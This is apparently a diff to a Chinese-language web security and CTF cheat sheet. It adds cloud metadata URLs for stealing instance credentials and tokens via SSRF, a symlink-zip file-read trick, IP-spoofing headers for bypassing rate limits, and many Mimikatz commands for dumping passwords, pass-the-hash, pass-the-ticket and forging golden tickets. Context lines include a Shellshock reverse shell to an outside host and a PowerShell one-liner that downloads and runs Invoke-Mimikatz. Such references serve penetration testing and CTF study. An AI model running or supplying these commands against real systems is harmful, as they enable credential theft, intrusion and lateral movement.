@@ -42,6 +42,7 @@ Table of Contents
     * [Bypass](#bypass-127001)
     * [Local Expolit](#本地利用)
     * [Remote Expolit](#遠程利用)
+    * [Metadata](#metadata)
     * [CRLF Injection](#crlf-injection)
     * [Finger Print](#fingerprint)
 *  [XXE](#xxe)
@@ -744,6 +745,12 @@ echo file_get_contents('bar/etc/passwd');
     - 7.3 - all versions to date
     - 7.4 - all versions to date
 
+- PHP SplDoublyLinkedList UAF Sandbox Escape
+    - https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/
+    - Affected
+        - PHP version 8.0 (alpha)
+        - PHP version 7.4.10 and prior (probably also future versions will be affected)
+
 - 族繁不及備載......        
 
 ## 其他
@@ -1067,7 +1074,7 @@ pop graphic-context
         - group_concat_max_len = 1024 (default)
     - json_arrayagg()
         - MySQL >= 5.7.22
-        - 同上
+        - 概念同上
             - e.g. `SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES`
     - greatest()
         - `greatest(a, b)`返回a, b中最大的
@@ -2468,7 +2475,61 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
         pop graphic-context
         ```
         - `$ convert ssrf.mvg out.png`
-    
+   
+## Metadata
+
+### AWS
+
+- http://169.254.169.254/latest/user-data
+- http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+- http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+- http://169.254.169.254/latest/meta-data/ami-id
+- http://169.254.169.254/latest/meta-data/reservation-id
+- http://169.254.169.254/latest/meta-data/hostname
+- http://169.254.169.254/latest/meta-data/public-keys/
+- http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+- http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+
+### Google Cloud
+
+- http://metadata.google.internal/computeMetadata/v1/
+- http://metadata.google.internal/computeMetadata/v1beta1/
+    - 請求不用加上 header
+- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+    - Access Token
+    - Check the scope of access token: `curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=XXXXXXXXXXXXXXXXXXX"`
+    - Call the Google api with token: `curl "https://www.googleapis.com/storage/v1/b?project=<your_project_id>" \ -H "Authorization: Bearer ya29..."` (list buckets)
+- http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+    - SSH public key
+- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
+    - kub-env
+- http://metadata.google.internal/computeMetadata/v1beta1/project/project-id
+- http://metadata.google.internal/computeMetadata/v1beta1/instance/name
+- http://metadata.google.internal/computeMetadata/v1beta1/instance/hostname
+- http://metadata.google.internal/computeMetadata/v1beta1/instance/zone
+
+
+### Digital Ocean
+
+- http://169.254.169.254/metadata/v1.json
+- http://169.254.169.254/metadata/v1/ 
+- http://169.254.169.254/metadata/v1/id
+- http://169.254.169.254/metadata/v1/user-data
+- http://169.254.169.254/metadata/v1/hostname
+- http://169.254.169.254/metadata/v1/region
+- http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+### Azure
+
+- http://169.254.169.254/metadata/v1/maintenance
+- http://169.254.169.254/metadata/instance?api-version=2020-06-01
+    - 需要加上 `Metadata: true` header
+
+### Alibaba
+
+- http://100.100.100.200/latest/meta-data/
+- http://100.100.100.200/latest/meta-data/instance-id
+- http://100.100.100.200/latest/meta-data/image-id
 
 ## CRLF injection
 
@@ -3065,7 +3126,9 @@ state[i] = state[i-3] + state[i-31]`
     
     - 列出php.ini路徑
 
-- `curl -i -X OPTIONS 'http://evil.com/'`
+- OPTIONS method
+    - 查看可用 HTTP method
+    - `curl -i -X OPTIONS 'http://evil.com/'`
 
 - ShellShock
     
@@ -3073,7 +3136,14 @@ state[i] = state[i-3] + state[i-31]`
     - `() { :a; }; /bin/cat /etc/passwd`
     - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
 
-- X-forwarded-for偽造來源IP
+- X-forwarded-for 偽造來源IP
+    - Client-IP
+    - X-Client-IP
+    - X-Remote-IP
+    - X-Remote-Addr
+    - X-Host
+    - ...
+    - 各種繞 Limit (e.g. Rate limit bypass)
 
 - DNS Zone Transfer
     - `dig @1.2.3.4 abc.com axfr`
@@ -3144,7 +3214,7 @@ state[i] = state[i-3] + state[i-31]`
     - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
     - 可以直接對Session寫入
 
-- polyglot image+.htaccess
+- polyglot image + .htaccess
     - XBM格式有定義在`exif_imagetype()`中
     - 符合`.htaccess`格式
     - Insomnihack CTF
@@ -3172,6 +3242,15 @@ state[i] = state[i-3] + state[i-31]`
         - Example 2:
             - [justiceleague](https://github.com/GrrrDog/ZeroNights-HackQuest-2016)
         - Example 3: [VolgaCTF 2019 - shop](https://github.com/w181496/CTF/tree/master/volgactf2019_quals/shop)
+
+- HTTP2 Push
+    - Server 自己 push 東西回來 (e.g. CSS/JS file)
+    - e.g. [ALLES CTF 2020 - Push](https://github.com/0x13A0F/CTF_Writeups/tree/master/alles_ctf#push)
+        - Chrome Net Export tool
+
+- Symlink
+    - `ln -s ../../../../../../etc/passwd kaibro.link`
+    - `zip --symlink bad.zip kaibro.link`
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
@@ -3295,6 +3374,7 @@ state[i] = state[i-3] + state[i-31]`
           ```
   - rbndr.us
       - `36573657.7f000001.rbndr.us`
+  - e.g. [BalsnCTF 2019 - 卍乂Oo韓國魚oO乂卍](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2019#%E5%8D%8D%E4%B9%82oo%E9%9F%93%E5%9C%8B%E9%AD%9Aoo%E4%B9%82%E5%8D%8D-koreanfish)
 
 - https://r12a.github.io/apps/encodings/
     - Encoding converter 
@@ -3302,9 +3382,25 @@ state[i] = state[i-3] + state[i-31]`
 - http://tool.leavesongs.com/
 
 - Mimikatz
-    - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
-    - powershell 無文件: `powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"`
-
+    - 撈密碼
+        - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
+        - powershell 無文件: `powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"`
+    - Pass The Hash
+        - `sekurlsa::pth /user:Administrator /domain:kaibro.local /ntlm:cc36cf7a8514893efccd332446158b1a`
+        - `sekurlsa::pth /user:Administrator /domain:kaibro.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`
+        - `sekurlsa::pth /user:Administrator /domain:kaibro.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`
+    - TGT
+        - `kerberos::tgt` (Displays informations about the TGT of the current session)
+    - List / Export Kerberos tickets of all sessions
+        - `sekurlsa::tickets /export`
+    - Pass The Ticket
+        - `kerberos::ptt Administrator@krbtgt-KAIBRO.LOCAL.kirbi`
+    - Golden
+        - generate the TGS with NTLM: `kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`
+        - generate the TGS with AES 128 key: `kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`
+        - generate the TGS with AES 256 key: `kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`
+    - Purge
+        - `kerberos::purge` (Purges all tickets of the current session)
 - WASM
     - https://wasdk.github.io/WasmFiddle/
     - https://webassembly.studio/
